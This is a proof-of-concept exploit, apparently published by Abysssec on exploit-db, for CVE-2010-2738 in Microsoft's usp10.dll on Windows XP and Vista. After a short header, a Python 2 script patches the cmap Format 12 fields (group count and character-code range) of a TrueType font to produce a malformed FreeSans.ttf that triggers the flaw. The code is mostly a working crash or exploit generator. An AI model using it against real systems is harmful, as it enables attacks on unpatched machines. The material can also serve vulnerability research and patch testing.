Microsoft Unicode Scripts Processor Remote Code Execution
=========================================================

  Title             : Microsoft Unicode Scripts Processor Remote Code Execution
  Version           : usp10.dll XP , Vista
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.microsoft.com
  Impact            : Critical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-2738
  MOAUB Number      : MOAUB-FINAL
 
http://www.exploit-db.com/moaub-30-microsoft-unicode-scripts-processor-remote-code-execution-ms10-063/
http://www.exploit-db.com/sploits/moaub-30-PoC.zip
&#039;&#039;&#039;
 
import sys
import struct
def main():
    
    try:
                 
        fdR = open(&#039;src.ttf&#039;, &#039;rb+&#039;)
        strTotal = fdR.read()
        str1 = strTotal[:18316]
        nGroups = &#039;\x00\x00\x00\xDC&#039;          # nGroups field from Format 12 subtable  of cmap table
        startCharCode = &#039;\x00\xE5\xF7\x20&#039;    # startCharCode  field from a Group Structure
        endCharCode  = &#039;\x00\xE5\xF7\xFE&#039;     # endCharCode  field from a Group Structure
        str2 = strTotal[18328:]
         
        fdW= open(&#039;FreeSans.ttf&#039;, &#039;wb+&#039;)
        fdW.write(str1)
        fdW.write(nGroups)
        fdW.write(startCharCode)
        fdW.write(endCharCode)
        fdW.write(str2)
        fdW.close()
        fdR.close()
        print &#039;[-] Font file generated&#039;
    except IOError:
        print &#039;[*] Error : An IO error has occurred&#039;
        print &#039;[-] Exiting ...&#039;
        sys.exit(-1)
                 
if __name__ == &#039;__main__&#039;:
    main()



